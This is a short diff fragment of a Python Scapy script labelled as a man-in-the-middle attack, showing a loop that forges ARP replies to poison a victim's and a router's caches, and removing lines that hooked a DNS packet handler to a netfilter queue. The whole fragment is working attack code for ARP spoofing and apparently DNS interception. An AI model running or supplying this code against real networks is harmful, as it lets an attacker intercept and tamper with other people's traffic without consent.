@@ -32,6 +32,3 @@ while True: # MITM
     spoof_arp_victim = Ether(src=mac_of_atk)/ARP(op=2, pdst=victim_IP, hwdst=victim_MAC, psrc=routeur_IP)
     send_spoof2 = sendp(spoof_arp_routeur)
     send_spoof1 = sendp(spoof_arp_victim)
-    queue.bind(0, dns_packet)
-    queue.run()
-    packet_transfer(dns_packet)
